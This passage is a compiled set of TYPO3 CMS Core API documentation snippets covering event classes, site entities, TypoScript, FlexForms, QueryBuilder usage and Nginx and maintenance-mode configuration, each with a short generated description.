BeforePagePreviewUriGeneratedEvent Class in PHP\nDESCRIPTION: This snippet defines the BeforePagePreviewUriGeneratedEvent class with various methods for getting and setting parameters related to page preview URI generation. It includes methods for handling preview URI, page ID, language ID, rootline, section, additional query parameters, context, and options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforePagePreviewUriGeneratedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Routing\\Event;\n\nclass BeforePagePreviewUriGeneratedEvent\n{\n    public function setPreviewUri(\\Psr\\Http\\Message\\UriInterface $uri): void\n    {\n        // Implementation not shown\n    }\n\n    public function getPreviewUri(): ?\\Psr\\Http\\Message\\UriInterface\n    {\n        // Implementation not shown\n    }\n\n    public function isPropagationStopped(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function getPageId(): int\n    {\n        // Implementation not shown\n    }\n\n    public function setPageId(int $pageId): void\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguageId(): int\n    {\n        // Implementation not shown\n    }\n\n    public function setLanguageId(int $languageId): void\n    {\n        // Implementation not shown\n    }\n\n    public function getRootline(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setRootline(array $rootline): void\n    {\n        // Implementation not shown\n    }\n\n    public function getSection(): string\n    {\n        // Implementation not shown\n    }\n\n    public function setSection(string $section): void\n    {\n        // Implementation not shown\n    }\n\n    public function getAdditionalQueryParameters(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setAdditionalQueryParameters(array $additionalQueryParameters): void\n    {\n        // Implementation not shown\n    }\n\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context\n    {\n        // Implementation not shown\n    }\n\n    public function getOptions(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Site Class in TYPO3 CMS Core\nDESCRIPTION: This snippet defines the Site class within the TYPO3\\CMS\\Core\\Site\\Entity namespace. It represents a single site with available languages and provides methods for accessing site configuration, languages, and error handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/Site.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Site\\Entity;\n\nclass Site\n{\n    public $invalidSets;\n\n    public function getIdentifier(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getBase(): \\Psr\\Http\\Message\\UriInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getRootPageId(): int\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguages(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getSets(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getAllLanguages(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguageById(int $languageId): \\TYPO3\\CMS\\Core\\Site\\Entity\\SiteLanguage\n    {\n        // Implementation not shown\n    }\n\n    public function getDefaultLanguage(): \\TYPO3\\CMS\\Core\\Site\\Entity\\SiteLanguage\n    {\n        // Implementation not shown\n    }\n\n    public function getAvailableLanguages(\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user, bool $includeAllLanguagesFlag = false, ?int $pageId = NULL): array\n    {\n        // Implementation not shown\n    }\n\n    public function getErrorHandler(int $statusCode): \\TYPO3\\CMS\\Core\\Error\\PageErrorHandler\\PageErrorHandlerInterface\n    {\n        // Implementation not shown\n    }\n\n    public function getConfiguration(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getRawConfiguration(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getSettings(): \\TYPO3\\CMS\\Core\\Site\\Entity\\SiteSettings\n    {\n        // Implementation not shown\n    }\n\n    public function getTypoScript(): ?\\TYPO3\\CMS\\Core\\Site\\Entity\\SiteTypoScript\n    {\n        // Implementation not shown\n    }\n\n    public function getAttribute(string $attributeName)\n    {\n        // Implementation not shown\n    }\n\n    public function getRouter(?\\TYPO3\\CMS\\Core\\Context\\Context $context = NULL): \\TYPO3\\CMS\\Core\\Routing\\RouterInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering ApplicationContext.php in composer.json\nDESCRIPTION: Shows how to configure composer.json to load a custom PHP file that sets the Application Context before TYPO3 bootstrap.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n    'autoload': {\n        'files': ['Source/Scripts/ApplicationContext.php']\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GitHub Link Handler Class in TYPO3\nDESCRIPTION: This class implements the LinkHandlerInterface for handling GitHub links in TYPO3's link browser. It includes properties for link attributes and configuration, dependency injection for PageRenderer, and methods for initialization and view assignment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GitHubLinkHandlerInitialize.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Controller\\AbstractLinkBrowserController;\nuse TYPO3\\CMS\\Core\\Page\\PageRenderer;\nuse TYPO3\\CMS\\Core\\View\\ViewInterface;\n\nclass GitHubLinkHandler implements LinkHandlerInterface\n{\n    protected array $linkAttributes = ['target', 'title', 'class', 'params', 'rel'];\n\n    protected array $linkParts = [];\n\n    protected ViewInterface $view;\n\n    protected array $configuration;\n\n    public function __construct(\n        // The page renderer is needed to register the JavaScript\n        private readonly PageRenderer $pageRenderer,\n    ) {}\n\n    public function initialize(\n        AbstractLinkBrowserController $linkBrowser,\n        $identifier,\n        array $configuration,\n    ): void {\n        $this->configuration = $configuration;\n    }\n\n    public function setView(ViewInterface $view): void\n    {\n        $this->view = $view;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from renderStatic() to render() Method (PHP)\nDESCRIPTION: Example of migrating a ViewHelper from using the deprecated renderStatic() method to the render() method, removing the CompileWithRenderStatic trait.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_11\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/MigrateRenderStatic.diff\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php (diff removing CompileWithRenderStatic)\n```\n\n----------------------------------------\n\nTITLE: Referencing DebugExceptionHandler Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet shows the fully qualified class name for the DebugExceptionHandler in TYPO3 CMS. It is used for handling and displaying detailed exception information during debugging.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/DebugExceptionHandler/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Error\\DebugExceptionHandler\n```\n\n----------------------------------------\n\nTITLE: Defining and Reusing Variables in TYPO3 TypoScript\nDESCRIPTION: This snippet demonstrates how to define a text variable using MyIdentifier and reuse it with operator copying. It can be used to simplify configurations by allowing for adjustments in a single point of definition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorCopy3.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n.. code-block:: typoscript\n   :caption: Extension examples, file Configuration/TypoScript/Syntax/OperatorCopy3/setup.typoscript\n\n   myIdentifier {\n      10 = TEXT\n      10.value = Hello world\n      20 < .10\n   }\n```\n\n----------------------------------------\n\nTITLE: Global Service Registry Reference in TYPO3\nDESCRIPTION: Reference to the global array that stores information about all registered services in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/ServiceRelatedApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['T3_SERVICES']\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Controller Action in TYPO3 CMS\nDESCRIPTION: This code snippet defines a BlogController class extending AbstractController in TYPO3 CMS. It includes a helloWorldAction method that returns a simple HTML response. The method demonstrates the use of ResponseInterface and the htmlResponse method for generating output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/View/HtmlResponseCustom.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Output <h1>Hello World!</h1>\n     */\n    public function helloWorldAction(): ResponseInterface\n    {\n        return $this->htmlResponse('<h1>Hello World!</h1>');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Listener for AfterDefaultUploadFolderWasResolvedEvent in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet shows an example implementation of an event listener for the AfterDefaultUploadFolderWasResolvedEvent in TYPO3 CMS. The event listener allows modification of the default upload folder after it has been resolved for the current page or user.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterDefaultUploadFolderWasResolvedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Resource\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Resource\\Event\\AfterDefaultUploadFolderWasResolvedEvent;\nuse TYPO3\\CMS\\Core\\Resource\\Folder;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterDefaultUploadFolderWasResolvedEvent $event): void\n    {\n        // Get the original folder\n        $originalFolder = $event->getFolder();\n\n        // Get context information\n        $table = $event->getTable();\n        $pid = $event->getPageId();\n\n        // Check if we want to handle this case\n        if ($table === 'pages' && $pid === 123) {\n            // Create a new folder/retrieve a different one\n            $myFolder = $this->createFolder();\n            \n            // Set the new folder\n            $event->setFolder($myFolder);\n        }\n    }\n\n    private function createFolder(): Folder\n    {\n        // Create a custom folder or retrieve a different one\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforePackageActivationEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the BeforePackageActivationEvent class within the TYPO3\\CMS\\Core\\Package\\Event namespace. The class represents an event triggered before a number of packages are activated in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforePackageActivationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Package\\Event\n\n..  php:class:: BeforePackageActivationEvent\n\n    Event that is triggered before a number of packages should become active\n\n    ..  php:method:: getPackageKeys()\n        :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Defining SiteLanguage Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the SiteLanguage class within the TYPO3\\CMS\\Core\\Site\\Entity namespace. The class represents a site_language configuration and provides methods for accessing various language-related properties and settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/SiteLanguage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Site\\Entity;\n\nclass SiteLanguage\n{\n    // Class methods are documented below\n}\n```\n\n----------------------------------------\n\nTITLE: Example Cache Action Array Structure in TYPO3\nDESCRIPTION: Demonstrates the structure of a cache action array element used in the ModifyClearCacheActionsEvent. Each action consists of an ID, title, description, URL, and icon identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyClearCacheActionsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'id' => 'pages',\n    'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:flushPageCachesTitle',\n    'description' => 'LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:flushPageCachesDescription',\n    'href' => (string)$uriBuilder->buildUriFromRoute('tce_db', ['cacheCmd' => 'pages']),\n    'iconIdentifier' => 'actions-system-cache-clear-impact-low'\n]\n```\n\n----------------------------------------\n\nTITLE: Disabling Directory Indexing in Nginx Configuration\nDESCRIPTION: This snippet describes how to disable autoindexing in Nginx by setting the autoindex parameter to off within a specific location block.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/DirectoryIndexing.rst#2025-04-16_snippet_2\n\nLANGUAGE: nginx\nCODE:\n```\nserver {\n   # ...\n\n   location /var/www/myhost/public {\n      autoindex off;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Documentation File Paths in TYPO3 Extensions using reStructuredText\nDESCRIPTION: This snippet demonstrates how file paths are referenced in TYPO3 documentation. It shows the syntax for referring to the Documentation directory and README file in an extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Documentation.rst#2025-04-16_snippet_1\n\nLANGUAGE: restructuredtext\nCODE:\n```\n:file:`EXT:{extkey}/Documentation/`\n```\n\n----------------------------------------\n\nTITLE: Working with BeforeFileMovedEvent in TYPO3 PHP\nDESCRIPTION: PSR-14 event that is triggered before a file is moved within a TYPO3 storage/driver system. This event allows for intervention or modification of the file moving process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFileMovedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFileMovedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining Document Structure with Table of Contents\nDESCRIPTION: reStructuredText markup for creating the document header and configuring the table of contents for event documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Lowlevel/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n========\nLowlevel\n========\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:lowlevel.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Surf Deployment Configuration in PHP\nDESCRIPTION: This code snippet represents a deployment configuration file for TYPO3 Surf. It defines how TYPO3 projects should be deployed to different environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Deployment/Surf/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace Vendor\\MyPackage\\Deployment;\n\nuse TYPO3\\Surf\\Domain\\Model\\Deployment;\n\nclass MyDeployment extends Deployment\n{\n    public function __construct()\n    {\n        parent::__construct('MyDeployment');\n        // Add your deployment configuration here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using EnrichFileMetaDataEvent in TYPO3 CMS\nDESCRIPTION: This code snippet shows the EnrichFileMetaDataEvent class from the TYPO3 Core Resource component. The event is triggered after file metadata has been loaded from the database and allows for runtime modification of the metadata.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/EnrichFileMetaDataEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\n/**\n * This event is fired after a record has been loaded from database.\n *\n * Listeners to this event could perform additional tasks and/or\n * modify/extend the metadata array.\n *\n * Example: Translation and workspace overlay.\n */\nfinal class EnrichFileMetaDataEvent\n{\n    private array $metaDataProperties;\n    private int $fileUid;\n    private string $tableName;\n\n    public function __construct(array $metaDataProperties, int $fileUid, string $tableName)\n    {\n        $this->metaDataProperties = $metaDataProperties;\n        $this->fileUid = $fileUid;\n        $this->tableName = $tableName;\n    }\n\n    public function getMetaDataProperties(): array\n    {\n        return $this->metaDataProperties;\n    }\n\n    public function setMetaDataProperties(array $metaDataProperties): void\n    {\n        $this->metaDataProperties = $metaDataProperties;\n    }\n\n    public function getFileUid(): int\n    {\n        return $this->fileUid;\n    }\n\n    public function getTableName(): string\n    {\n        return $this->tableName;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Including Screenshot of Install Tool Password Change Screen in RST Documentation\nDESCRIPTION: ReStructuredText directive for including a screenshot of the TYPO3 Install Tool password change interface. The image is automatically generated by the TYPO3 Screenshots project and includes styling for a shadow effect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/ChangeInstallToolPassword.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/ChangeInstallToolPassword.png\n   :class: with-shadow\n\n   Screen to change the Install Tool password\n```\n\n----------------------------------------\n\nTITLE: Configuring Total Backend Shutdown in TYPO3\nDESCRIPTION: PHP configuration to completely lock down the TYPO3 backend, preventing access for all users including administrators. This setting also blocks CLI commands and scheduler tasks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/MaintenanceMode/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Lock the backend for editors, admins and CLI are allowed\n$GLOBALS['TYPO3_CONF_VARS']['BE']['adminOnly'] = -1;\n```\n\n----------------------------------------\n\nTITLE: Creating JQuery Content for MultiStepWizard Slide\nDESCRIPTION: Example of creating content for a MultiStepWizard slide using JQuery. This approach allows including unescaped HTML content in a slide.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/MultiStepWizard.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n$(`<div>Your HTML content</div>`);\n```\n\n----------------------------------------\n\nTITLE: Using ExpressionBuilder::space() in TYPO3 Repository (PHP)\nDESCRIPTION: Demonstrates the use of the space() function in a TYPO3 repository to create a string of space characters. It shows how to use QueryBuilder to generate a SELECT statement with a space string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_17\n\nLANGUAGE: PHP\nCODE:\n```\npublic function findWithSpaces(): array\n{\n    $queryBuilder = $this->connectionPool->getQueryBuilderForTable('my_table');\n    $queryBuilder\n        ->select('uid')\n        ->addSelect(\n            $queryBuilder->expr()->space(5),\n            'space_value'\n        )\n        ->from('my_table');\n\n    return $queryBuilder->executeQuery()->fetchAllAssociative();\n}\n```\n\n----------------------------------------\n\nTITLE: Basic FlexForm Data Structure Example in XML\nDESCRIPTION: Example of a basic FlexForm data structure from the typo3/cms-styleguide extension, demonstrating the XML structure with various elements including ROOT, sheets, and form field definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/T3datastructure/Elements/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<T3DataStructure>\n    <meta>\n        <langDisable>1</langDisable>\n    </meta>\n    <sheets>\n        <sDEF>\n            <ROOT>\n                <TCEforms>\n                    <sheetTitle>LLL:EXT:styleguide/Resources/Private/Language/locallang.xlf:simple</sheetTitle>\n                </TCEforms>\n                <type>array</type>\n                <el>\n                    <input_1>\n                        <TCEforms>\n                            <label>input_1</label>\n                            <config>\n                                <type>input</type>\n                                <size>30</size>\n                                <eval>trim</eval>\n                            </config>\n                        </TCEforms>\n                    </input_1>\n                </el>\n            </ROOT>\n        </sDEF>\n        <s_tabs>\n            <ROOT>\n                <TCEforms>\n                    <sheetTitle>Tabs</sheetTitle>\n                </TCEforms>\n                <type>array</type>\n                <el>\n                    <tabs_1>\n                        <section>1</section>\n                        <type>array</type>\n                        <el>\n                            <container_1>\n                                <type>array</type>\n                                <title>LLL:EXT:styleguide/Resources/Private/Language/locallang.xlf:tabs_1</title>\n                                <el>\n                                    <input_1>\n                                        <TCEforms>\n                                            <label>Tab 1 - input_1</label>\n                                            <config>\n                                                <type>input</type>\n                                                <size>30</size>\n                                                <eval>trim</eval>\n                                            </config>\n                                        </TCEforms>\n                                    </input_1>\n                                </el>\n                            </container_1>\n                            <container_2>\n                                <type>array</type>\n                                <title>LLL:EXT:styleguide/Resources/Private/Language/locallang.xlf:tabs_2</title>\n                                <el>\n                                    <input_1>\n                                        <TCEforms>\n                                            <label>Tab 2 - input_1</label>\n                                            <config>\n                                                <type>input</type>\n                                                <size>30</size>\n                                                <eval>trim</eval>\n                                            </config>\n                                        </TCEforms>\n                                    </input_1>\n                                </el>\n                            </container_2>\n                        </el>\n                    </tabs_1>\n                </el>\n            </ROOT>\n        </s_tabs>\n        <s_flex>\n            <ROOT>\n                <TCEforms>\n                    <sheetTitle>Flex</sheetTitle>\n                </TCEforms>\n                <type>array</type>\n                <el>\n                    <flex_1>\n                        <TCEforms>\n                            <label>flex_1</label>\n                            <config>\n                                <type>flex</type>\n                                <ds>\n                                    <default>\n                                        <T3DataStructure>\n                                            <ROOT>\n                                                <type>array</type>\n                                                <el>\n                                                    <input_1>\n                                                        <TCEforms>\n                                                            <label>input_1</label>\n                                                            <config>\n                                                                <type>input</type>\n                                                                <size>30</size>\n                                                                <eval>trim</eval>\n                                                            </config>\n                                                        </TCEforms>\n                                                    </input_1>\n                                                </el>\n                                            </ROOT>\n                                        </T3DataStructure>\n                                    </default>\n                                </ds>\n                            </config>\n                        </TCEforms>\n                    </flex_1>\n                </el>\n            </ROOT>\n        </s_flex>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Records from TYPO3 Backend Clipboard in PHP\nDESCRIPTION: Demonstrates how to retrieve specific types of records (files and pages) from different clipboard pads using the elFromTable() method. It also shows how to switch between clipboard pads.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Clipboard.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$clipboard = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\\TYPO3\\CMS\\Backend\\Clipboard\\Clipboard::class);\n$clipboard->initializeClipboard();\n$currentPad = $clipboard->current;\n$filesInClipboard = $clipboard->elFromTable('_FILE');\n$pagesInClipboard = $clipboard->elFromTable('pages');\n$clipboard->setCurrentPad('normal');\n$normalPadContent = $clipboard->elFromTable('tt_content');\n```\n\n----------------------------------------\n\nTITLE: Implementing Debug Output in TYPO3 Fluid Template\nDESCRIPTION: This HTML snippet demonstrates a TYPO3 Fluid template for an admin module. It includes a layout, a content section with translations, and uses the debug ViewHelper to output cookie information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/_ModuleConfiguration/_DebugHtml.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html data-namespace-typo3-fluid=\"true\" xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\">\n\n   <f:layout name=\"Module\" />\n\n   <f:section name=\"Content\">\n      <h1><f:translate key=\"LLL:EXT:examples/Resources/Private/Language/locallang_examples.xlf:function_debug\"/></h1>\n      <p><f:translate key=\"LLL:EXT:examples/Resources/Private/Language/locallang_examples.xlf:function_debug_intro\"/></p>\n      <p><f:debug inline=\"1\">{cookies}</f:debug></p>\n   </f:section>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Implementing DeferredAction with ES6 modules in TYPO3 Notification API\nDESCRIPTION: Example showing how to implement a DeferredAction in the TYPO3 Notification API using ES6 modules. DeferredAction is used for long-running tasks that return a Promise, such as AJAX requests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport Notification from '@typo3/backend/notification';\nimport DeferredAction from '@typo3/backend/action-button/deferred-action';\nimport AjaxRequest from '@typo3/core/ajax/ajax-request';\n\nNotification.info(\n  'Update required', \n  'The system requires an update.',\n  0,\n  [\n    {\n      label: 'Execute update',\n      action: new DeferredAction(() => {\n        return new AjaxRequest('/api/upgrade').post({\n          // Parameters\n        }).then(async (response) => {\n          const result = await response.resolve();\n          if (result.success) {\n            Notification.success('Updated', 'System successfully updated');\n          }\n          return result;\n        });\n      })\n    }\n  ]\n);\n\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Warning Mode Configuration\nDESCRIPTION: This code snippet shows how to access the configuration variable that controls when email notifications are sent upon successful backend logins. It can be set to 0 (disabled), 1 (all logins), or 2 (admin logins only).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/GlobalTypo3Options.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['warning_mode']\n```\n\n----------------------------------------\n\nTITLE: Submitting Form Data in TYPO3 CMS\nDESCRIPTION: This HTML snippet demonstrates how to structure a form input field for submitting data to the '/record/commit' route. It shows the naming convention for the 'data' array, which includes the table name, UID, and field name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/TceDb/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<input name=\"data[tt_content][123][header]\" value=\"This is the headline\">\n```\n\n----------------------------------------\n\nTITLE: Class Information Block Example in PHP\nDESCRIPTION: Shows an example of the class information block that should precede the PHP class definition.  This block provides basic information about the class, including a description of its purpose and functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/FileStructure.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n/**\n     * This class provides XYZ plugin implementation.\n     */\n```\n\n----------------------------------------\n\nTITLE: Querying with RootlevelRestriction in SQL\nDESCRIPTION: Example of how the RootlevelRestriction adds a WHERE clause to match records on the root level.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: SQL\nCODE:\n```\nAND (`pid` = 0)\n```\n\n----------------------------------------\n\nTITLE: Customizing File Field Appearance in TCA Overrides\nDESCRIPTION: Example showing how to customize a file field's appearance by suppressing upload and external URL buttons, leaving only the 'Create new relation' button visible.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Tca.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'columns' => [\n    'my_file_field' => [\n        'config' => [\n            'appearance' => [\n                'fileUploadAllowed' => false,\n                'fileByUrlAllowed' => false,\n            ],\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Debugging SQL Query with getSQL() in TYPO3\nDESCRIPTION: Demonstrates how to use getSQL() method to debug a SQL query in TYPO3. It selects all columns from the sys_language table and outputs the SQL statement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_25\n\nLANGUAGE: PHP\nCODE:\n```\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language');\n$queryBuilder\n    ->select('*')\n    ->from('sys_language');\ndebug($queryBuilder->getSQL());\n$result = $queryBuilder->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Example of Autoload Classmap in TYPO3\nDESCRIPTION: A sample of the generated autoload_classmap.php file that maps class names to their file locations on disk. This file is used by TYPO3 in non-Composer mode to locate and load classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Autoloading/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n// autoload_classmap.php @generated by TYPO3\n\n$typo3InstallDir = \\TYPO3\\CMS\\Core\\Core\\Environment::getPublicPath();\n\nreturn array(\n    'Schnitzler\\\\Templavoila\\\\Clipboard\\\\Clipboard' => $typo3InstallDir . 'typo3conf/ext/templavoila/Classes/Clipboard/Clipboard.php',\n    'tx_templavoila_pi1' => $typo3InstallDir . 'typo3conf/ext/templavoila/Compatibility/class.tx_templavoila_pi1.php',\n    ...\n);\n```\n\n----------------------------------------\n\nTITLE: Referencing Previous Hook Method in TYPO3 